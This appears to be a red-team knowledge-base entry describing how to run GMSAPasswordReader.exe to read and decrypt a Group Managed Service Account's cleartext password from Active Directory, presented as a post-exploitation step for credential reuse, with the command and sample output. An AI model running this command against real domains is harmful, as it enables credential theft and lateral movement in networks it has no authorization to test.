---
type: command
executor: powershell
data: GMSAPasswordReader.exe --accountname SVC_SERVICE_ACCOUNT
tags:
  - credential-access
  - active-directory
platforms:
  - Windows
verified: true
validated: true
---

# Run GMSAPasswordReader to Retrieve GMSA Password

## Command

```powershell
GMSAPasswordReader.exe --accountname SVC_SERVICE_ACCOUNT
```

## Description

This command executes the GMSAPasswordReader tool to retrieve and decrypt the password for a specified Group Managed Service Account (GMSA) from Active Directory. It uses the current machine's domain context to query the msDS-ManagedPassword attribute and decrypts it on-the-fly, outputting the cleartext password. Use this during post-exploitation when targeting known service accounts for credential reuse.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--accountname` | The name of the GMSA account to target (e.g., SVC_SERVICE_ACCOUNT) | Yes |

## Examples

### Basic Usage

```powershell
GMSAPasswordReader.exe --accountname SVC_SERVICE_ACCOUNT
```

### Advanced Usage

Run from an elevated prompt on a domain-joined machine for best results.

## Expected Output

```
Account: SVC_SERVICE_ACCOUNT
Password: P@ssw0rd123!
```

The output displays the account name and its decrypted password if successful. Errors include access denied if permissions are insufficient.

## Related

- [[procedures/extract-gmsa-passwords-from-active-directory]]
- [[tools/gmsapasswordreader]]
